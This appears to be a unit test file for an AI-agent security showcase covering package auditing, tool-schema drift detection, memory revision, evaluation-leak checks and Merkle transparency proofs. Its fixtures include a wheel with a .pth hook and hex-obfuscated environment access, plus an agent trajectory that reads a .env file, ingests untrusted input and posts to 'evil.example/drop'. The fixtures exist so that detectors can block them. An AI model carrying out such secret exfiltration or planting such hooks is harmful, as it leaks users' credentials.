"""End-to-end unit and integration tests for the 5-Layer Verifiable Agent Stack Showcase."""
from __future__ import annotations

import io
import json
from pathlib import Path
import subprocess
import sys
import unittest
from contextlib import redirect_stdout

REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from examples.verifiable_agent_stack_e2e import (  # noqa: E402
    BiTemporalPolicyFact,
    EvalSpan,
    SIBLING_REPOSITORIES,
    audit_wheelcap_layer1,
    bitemporal_revise_split,
    build_inmemory_wheel,
    evaluate_drift_watch_endpoint,
    format_human_report,
    generate_and_audit_cpcv,
    main as showcase_main,
    pigeonhole_simhash_contaminated,
    query_bitemporal_anti_crowding,
    run_verifiable_agent_stack_showcase,
    verify_showcase_invariants,
)
from proofgate.muhur_rfc6962 import (  # noqa: E402
    canonical_json_bytes,
    verify_consistency_proof,
    verify_inclusion_proof,
)
from proofgate.trajectory_difc_gate import evaluate_trajectory  # noqa: E402


class TestVerifiableAgentStackE2E(unittest.TestCase):
    def test_full_10_step_episode_executes_under_half_second(self) -> None:
        bundle = run_verifiable_agent_stack_showcase()
        verify_showcase_invariants(bundle)
        self.assertEqual(bundle["episode_step_count"], 10)
        self.assertLess(bundle["elapsed_ms"], 500.0)
        self.assertEqual(len(bundle["repositories"]), 6)

    def test_sibling_repositories_and_palomar_links_present(self) -> None:
        names = {r["name"] for r in SIBLING_REPOSITORIES}
        self.assertEqual(
            names,
            {
                "wheelcap",
                "drift-watch",
                "temporal-gaba-memory",
                "leakspec-cli",
                "proofgate",
                "erdos642-ces",
            },
        )
        palomar_entry = [r for r in SIBLING_REPOSITORIES if r["name"] == "erdos642-ces"][0]
        self.assertEqual(palomar_entry["version"], "PALOMAR-2026-11-26-000062")

    def test_layer1_wheelcap_allows_clean_and_blocks_pth_ast_exfil(self) -> None:
        clean_src = {"pkg/__init__.py": b"def add(a, b):\n    return a + b\n"}
        clean_whl = build_inmemory_wheel("pkg", "1.0", clean_src, ["pkg/__init__.py"])
        res_ok = audit_wheelcap_layer1("pkg", "1.0", clean_src, clean_whl)
        self.assertEqual(res_ok["decision"], "ALLOW")
        self.assertEqual(res_ok["verdict"], "CAPABILITY_CLEAN")

        bad_files = dict(clean_src)
        bad_files["hook.pth"] = b"import pkg\n"
        bad_files["pkg/__init__.py"] = (
            b"import os\n"
            b"x = getattr(os, bytes.fromhex('656e7669726f6e').decode())\n"
        )
        bad_whl = build_inmemory_wheel("pkg", "1.0", bad_files, ["pkg/__init__.py"])
        res_bad = audit_wheelcap_layer1("pkg", "1.0", clean_src, bad_whl)
        self.assertEqual(res_bad["decision"], "BLOCK")
        self.assertIn("WC-PTH-001", res_bad["triggered_rules"])
        self.assertIn("WC-AST-EXFIL-002", res_bad["triggered_rules"])
        self.assertIn("unrecorded_member:hook.pth", res_bad["record_anomalies"])

    def test_layer2_drift_watch_absorbs_single_429_and_quarantines_mutation(self) -> None:
        schema = {"name": "search", "version": "1.0", "params": {"q": "string"}}
        clean_res = evaluate_drift_watch_endpoint(
            "mcp://svc/search",
            endpoint_index=3,
            pinned_schema=schema,
            probe_ticks=[{"probe_a_status": 429, "probe_b_status": 200, "probe_a_schema": schema, "probe_b_schema": schema}],
        )
        self.assertEqual(clean_res["decision"], "ALLOW")
        self.assertEqual(clean_res["verdict"], "CORROBORATED_CLEAN")
        self.assertEqual(clean_res["transient_429_absorbed"], 1)

        drifted_schema = {"name": "search", "version": "1.0", "params": {"q": "string", "leak": "url"}}
        drift_res = evaluate_drift_watch_endpoint(
            "mcp://svc/search",
            endpoint_index=3,
            pinned_schema=schema,
            probe_ticks=[
                {"probe_a_status": 200, "probe_b_status": 200, "probe_a_schema": drifted_schema, "probe_b_schema": drifted_schema},
                {"probe_a_status": 200, "probe_b_status": 200, "probe_a_schema": drifted_schema, "probe_b_schema": drifted_schema},
            ],
        )
        self.assertEqual(drift_res["decision"], "BLOCK")
        self.assertEqual(drift_res["verdict"], "CUSUM_DRIFT_QUARANTINE")

    def test_layer3_bitemporal_anti_crowding_eliminates_stale_trap_at_1(self) -> None:
        q = (0.95, 0.25, 0.10, 0.05)
        rows = [
            BiTemporalPolicyFact(
                fact_id=f"v1-{i}",
                entity="host:api.partner.example",
                attribute="policy",
                value="ALLOWED",
                valid_from=0,
                valid_until=50,
                tx_from=1,
                tx_until=None,
                embedding=(0.95 - 0.0002 * i, 0.25, 0.10, 0.05),
            )
            for i in range(16)
        ]
        v2 = BiTemporalPolicyFact(
            fact_id="v2-revoked",
            entity="host:api.partner.example",
            attribute="policy",
            value="REVOKED",
            valid_from=2,
            valid_until=50,
            tx_from=2,
            tx_until=None,
            embedding=(0.88, 0.38, 0.15, 0.09),
        )
        revised = bitemporal_revise_split(rows, v2, tx_now=2)
        ans = query_bitemporal_anti_crowding(revised, q, valid_at=10, tx_at=10, crowding_m=15)
        self.assertEqual(ans["naive_stale_trap_at_1_pct"], 100.0)
        self.assertEqual(ans["stale_trap_at_1_pct"], 0.0)
        self.assertEqual(ans["bitemporal_top1_value"], "REVOKED")

    def test_layer4_leakspec_cpcv_and_simhash_pigeonhole(self) -> None:
        spans = [EvalSpan(idx=i, t_start=i, t_end=i + 4) for i in range(36)]
        bad_te = tuple(range(6, 12))
        bad_tr = tuple(i for i in range(36) if i < 2 or i >= 16)
        leaked = generate_and_audit_cpcv(spans, [(bad_tr, bad_te)], embargo_bars=3)
        self.assertEqual(leaked["verdict"], "LEAK_DETECTED")
        self.assertIn("LS-CPCV-001", leaked["triggered_rules"])

        clean = generate_and_audit_cpcv(spans, None, n_groups=6, n_test_groups=2, embargo_bars=3)
        self.assertEqual(clean["verdict"], "CPCV_PURGED_CLEAN")
        self.assertEqual(clean["num_splits"], 15)
        self.assertEqual(clean["num_backtest_paths"], 5)

        bench = [
            "verify deterministic bitemporal belief revision without mutable in place overwrites "
            "across long horizon autonomous multi agent episodes under crowding starvation and "
            "snodgrass valid time transaction time split consistency invariants"
        ]
        near = (
            "verify deterministic bitemporal belief revision without mutable in place overwrite "
            "across long horizon autonomous multi agent episodes under crowding starvation and "
            "snodgrass valid time transaction time split consistency invariants"
        )
        far = "completely unrelated elliptic curve rational torsion subgroup computation over number fields"
        hit_near, dist_near = pigeonhole_simhash_contaminated(near, bench, max_hamming=7)
        hit_far, _ = pigeonhole_simhash_contaminated(far, bench, max_hamming=7)
        self.assertTrue(hit_near)
        self.assertLessEqual(dist_near, 7)
        self.assertFalse(hit_far)

    def test_layer5_evaluate_trajectory_alias_and_live_difc(self) -> None:
        key = b"server-hmac-key-32bytes-00000000"
        traj = {
            "trajectory_id": "test-alias-traj",
            "initial_integrity": "USER_EXPLICIT",
            "steps": [
                {
                    "step_index": 0,
                    "tool_name": "read_env",
                    "action_kind": "read_resource",
                    "arguments": {"path": "/workspace/.env"},
                },
                {
                    "step_index": 1,
                    "tool_name": "fetch_untrusted",
                    "action_kind": "read_resource",
                    "source_integrity": "UNTRUSTED_EXTERNAL",
                    "arguments": {"path": "/workspace/untrusted.txt"},
                },
                {
                    "step_index": 2,
                    "tool_name": "post_out",
                    "action_kind": "http_post",
                    "arguments": {"url": "https://evil.example/drop"},
                },
            ],
        }
        res = evaluate_trajectory(traj, macaroon_key=key)
        self.assertEqual(res.verdict, "REJECT")
        self.assertIn("PG-TRAJ-001", res.triggered_rule_ids)

    def test_rfc6962_bundle_offline_inclusion_consistency_and_tamper_rejection(self) -> None:
        bundle = run_verifiable_agent_stack_showcase()
        tb = bundle["transparency_bundle"]
        root = tb["root_hash"]
        leaves = tb["layer_leaves"]
        proofs = tb["per_layer_inclusion_proofs"]
        self.assertEqual(len(leaves), 5)
        for idx, leaf in enumerate(leaves):
            raw = canonical_json_bytes(leaf)
            self.assertTrue(verify_inclusion_proof(raw, idx, 5, proofs[idx]["audit_path"], root))
            flipped = raw[:-1] + bytes([raw[-1] ^ 0xFF])
            self.assertFalse(verify_inclusion_proof(flipped, idx, 5, proofs[idx]["audit_path"], root))

        c25 = tb["consistency_2_to_5"]
        self.assertTrue(
            verify_consistency_proof(
                c25["old_size"],
                c25["new_size"],
                c25["consistency_path"],
                c25["old_root"],
                c25["new_root"],
            )
        )

    def test_deterministic_merkle_root_across_repeated_runs(self) -> None:
        import time as _time
        from unittest.mock import patch
        from examples.verifiable_agent_stack_e2e import build_inmemory_wheel
        import zipfile

        whl = build_inmemory_wheel("demo_pkg", "1.0.0", {"demo_pkg/__init__.py": b"x = 1\n"}, ["demo_pkg/__init__.py"])
        with zipfile.ZipFile(io.BytesIO(whl), "r") as zf:
            for info in zf.infolist():
                self.assertEqual(info.date_time, (1980, 1, 1, 0, 0, 0))

        with patch.object(_time, "localtime", return_value=_time.struct_time((2026, 11, 27, 8, 0, 0, 4, 331, 0))):
            b1 = run_verifiable_agent_stack_showcase()
        with patch.object(_time, "localtime", return_value=_time.struct_time((2031, 5, 19, 22, 45, 18, 0, 139, 0))):
            b2 = run_verifiable_agent_stack_showcase()
        self.assertEqual(
            b1["transparency_bundle"]["root_hash"],
            b2["transparency_bundle"]["root_hash"],
        )
        self.assertEqual(
            b1["transparency_bundle"]["per_layer_inclusion_proofs"],
            b2["transparency_bundle"]["per_layer_inclusion_proofs"],
        )

    def test_cli_json_and_selftest_modes_and_zero_byte36(self) -> None:
        buf_json = io.StringIO()
        with redirect_stdout(buf_json):
            rc_json = showcase_main(["--json"])
        self.assertEqual(rc_json, 0)
        raw_out = buf_json.getvalue()
        self.assertEqual(raw_out.encode("utf-8").count(36), 0)
        parsed = json.loads(raw_out)
        self.assertEqual(parsed["transparency_bundle"]["offline_inclusion_verification"], "PASS")
        self.assertGreaterEqual(parsed["sarif_v210_summary"]["total_findings"], 7)

        buf_st = io.StringIO()
        with redirect_stdout(buf_st):
            rc_st = showcase_main(["--selftest"])
        self.assertEqual(rc_st, 0)
        self.assertIn("[PASS]", buf_st.getvalue())

        report_txt = format_human_report(parsed)
        self.assertIn("Merkle Root (SHA-256)", report_txt)
        self.assertEqual(report_txt.encode("utf-8").count(36), 0)

    def test_subprocess_direct_invocation_without_installed_wheel(self) -> None:
        proc = subprocess.run(
            [sys.executable, str(REPO_ROOT / "examples" / "verifiable_agent_stack_e2e.py"), "--selftest"],
            cwd=str(REPO_ROOT),
            capture_output=True,
            text=True,
            timeout=10,
            check=False,
        )
        self.assertEqual(proc.returncode, 0, msg=proc.stderr)
        self.assertIn("[PASS] 5-Layer Verifiable Agent Stack", proc.stdout)

    def test_showcase_docs_and_files_have_zero_opsec_leaks(self) -> None:
        forbidden = (
            "/" + "home" + "/" + "alp",
            "alp" + "lab",
            "dunya" + "lab",
            "alp" + "ess",
            "taste" + "twin",
        )
        targets = (
            REPO_ROOT / "examples" / "verifiable_agent_stack_e2e.py",
            REPO_ROOT / "docs" / "VERIFIABLE_AGENT_STACK_ARCHITECTURE.md",
            REPO_ROOT / "tests" / "test_verifiable_agent_stack_e2e.py",
            REPO_ROOT / "README.md",
        )
        for p in targets:
            low = p.read_text(encoding="utf-8").lower()
            for term in forbidden:
                self.assertNotIn(term, low, f"Found forbidden term {term!r} in {p.name}")
            self.assertEqual(p.read_bytes().count(36), 0, f"Found byte 36 in {p.name}")


if __name__ == "__main__":
    unittest.main()
